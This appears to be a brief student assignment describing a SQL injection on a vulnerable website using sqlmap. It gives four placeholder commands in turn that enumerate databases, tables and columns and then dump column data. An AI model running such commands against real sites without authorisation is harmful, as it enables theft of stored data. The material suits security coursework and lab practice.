In the following assignment we conduct a SQL injection on a vulnurable website.

1) the first command we use is:
"sqlmap <website link with get query> --dbs"
this will scan the website and tell us the database that is being used at the backend, the number of databases and their names.

2) the next command is:
"sqlmap <website link with get query> -D <db name> --tables"
this will return all the tables inside the specified database 

3) moving towards the nexxt command:
"sqlmap <website link with get query> -D <db name> -T <table name> --columns"
this command will scan the specified table and return all the columns inside

4) finally:
"sqlmap <website link with get query> -D <db name> -T <table name> -C <column name> --dump"
this will can the column that is specified and dump all the data in that file to a csv file.
